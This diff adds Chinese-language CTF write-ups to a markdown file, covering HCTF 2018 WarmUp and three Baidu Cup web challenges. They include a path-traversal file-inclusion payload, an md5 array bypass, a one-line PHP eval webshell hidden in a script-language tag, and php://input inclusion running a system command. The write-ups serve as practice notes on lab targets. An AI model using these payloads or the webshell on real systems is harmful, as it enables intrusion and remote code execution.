@@ -255,3 +255,194 @@ flag便传到了服务器上
 
 成功返回flag值，奥利给，又学了新东西。
 
+### [HCTF 2018]WarmUp 1
+
+这是一个代码审计题，首先进入网站，查看源码
+
+### ![image-20210502180730817](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502180730817.png)
+
+发现了提示信息，然后咱们在URL地址中输入 `source.php`，查看跳转页面，页面显示如下代码，好吧，开始看代码吧。。。。。。
+
+~~~php+HTML
+ <?php
+    highlight_file(__FILE__);
+    class emmm
+    {
+        public static function checkFile(&$page)
+        {	//定义了白名单
+            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
+//isset()判断变量是否声明,is_string()判断变量是否是字符串 &&用了逻辑与两个值都为真才执行if里面的值
+            if (! isset($page) || !is_string($page)) {
+                echo "you can't see it";
+                return false;
+            }
+//file里输入的内容是否是白名单内的字符串，符合则返回true
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+ //过滤问号的函数(如果$page的值有?则从?之前提取字符串,没有则提取整个字符串)
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')//返回$page.?里卖弄?号出现的第一个位置
+            );
+//第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真，此时我用的payload已经符合，返回true            
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+//url对$page解码
+            $_page = urldecode($page);
+//过滤问号的函数           
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . '?', '?')
+            );
+//第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真            
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo "you can't see it";
+            return false;
+        }
+    }
+
+    if (! empty($_REQUEST['file'])		#file不能为空
+        && is_string($_REQUEST['file'])	#file必须为字符串
+        && emmm::checkFile($_REQUEST['file'])#要符合checkFile函数，成功返回True
+    ) {
+        include $_REQUEST['file'];		#执行文件包含命令
+        exit;
+    } else {
+        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
+    }  
+?>
+
+~~~
+
+发现白名单中还有个 `hint.php`文件，进去看看，告诉我们flag在哪里。
+
+![image-20210502181936929](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502181936929.png)
+
+**payload：**
+
+~~~php
+?file=hint.php?../../../../../ffffllllaaaagggg
+~~~
+
+我们可以想象他传入checkFile函数要经历 第一次白名单验证, 一次?过滤后,他就是hint.php 再进行一次白名单验证 返回为真, 则达成条件进行包含得到flag
+
+![image-20210502182300265](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502182300265.png)
+
+### “百度杯”CTF比赛 2017 二月场——爆破3
+
+进入网站
+
+![image-20210502183455576](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502183455576.png)
+
+映入眼帘的又是PHP代码，看来PHP是世界上最好的语言这句话没有错啊，哈哈哈哈，靶场全都是PHP代码，慢慢积累慢慢学吧。
+
+说正题，先阅读一下代码，大体意思是Session中的num初始值为0，time为当前时间，whoami的初始值为ea。120秒之后销毁会话。用str_rands随机生成2个字母，whoami需要等于我们传递的value值的前两位，并且value的md5值的第5为开始，长度为4的字符串==0，这样num++，whoami=str_rands，循环10次后，输出flag。
+
+
+~~~php
+<?php 
+error_reporting(0);//不显示错误信息
+session_start();//启动新会话或者重用现有会话
+require('./flag.php');
+if(!isset($_SESSION['nums'])){//给session会话初试赋值
+  $_SESSION['nums'] = 0;
+  $_SESSION['time'] = time();
+  $_SESSION['whoami'] = 'ea';
+}
+
+if($_SESSION['time']+120<time()){//120秒之后销毁session会话
+  session_destroy();
+}
+
+$value = $_REQUEST['value'];
+$str_rand = range('a', 'z');
+$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];
+//
+if($_SESSION['whoami']==($value[0].$value[1]) && substr(md5($value),5,4)==0){
+  $_SESSION['nums']++;
+  $_SESSION['whoami'] = $str_rands;
+  echo $str_rands;
+}
+
+if($_SESSION['nums']>=10){	//num>=10会输出flag
+  echo $flag;
+}
+
+show_source(__FILE__);
+?>
+
+~~~
+
+由19行可看出为弱判断类型，可以用数组进行绕过，md5函数不能对数组进行处理，所以传数组。md5()==0
+
+根据获取到的信息构造payload    ?value[]=ea
+
+代码中提到需要提交大于10次，10次过后得到flag
+
+![image-20210502190337932](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502190337932.png)
+
+本题学到了数组在传值的应用，以及md5对数组加密无效。加油！！！
+
+### “百度杯”CTF比赛 九月场——Upload
+
+打开网页上传shell文件，结果发现前面的<?php被限制去掉了
+
+![image-20210502194728556](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502194728556.png)
+
+百度了一下原来还有PHP长标签，又是收获啊
+
+~~~javascript
+<script language="PHP"> //php小写被过滤了，所以改成了大写，也可以大小写混合
+  @eval($_POST["pass"]);    
+</script>
+~~~
+
+再次上传shell脚本，结果页面无显示，说明上传成功了。接下来就是打开蚁剑，建立连接成功。
+
+![image-20210502195327414](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502195327414.png)
+
+成功获得flag
+
+![image-20210502195626813](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502195626813.png)
+
+### “百度杯”CTF比赛 2017 二月场——include
+
+进入页面
+
+![image-20210502195853956](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502195853956.png)
+
+先搜索一下是否允许文件包含，给你phpinfo的作用不就是这样，发现允许文件包含，所以可以用`php://input`伪协议包含文件。
+
+![image-20210502200012326](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502200012326.png)
+
+接下来看代码要求
+
+~~~php
+<?php 
+show_source(__FILE__);
+if(isset($_REQUEST['path'])){
+    include($_REQUEST['path']);
+}else{
+    include('phpinfo.php');
+}
+~~~
+
+path可以直接传参数进行文件包含。。。抓包，用PHP伪协议执行php代码，没想到成功了。
+
+![image-20210502201036831](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502201036831.png)
+
+发现了个可以的文件名，直接执行linux系统命令
+
+~~~php
+<?php system("cat dle345aae.php");?>
+~~~
+
+成功获得flag
+
+![image-20210502201315455](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210502201315455.png)
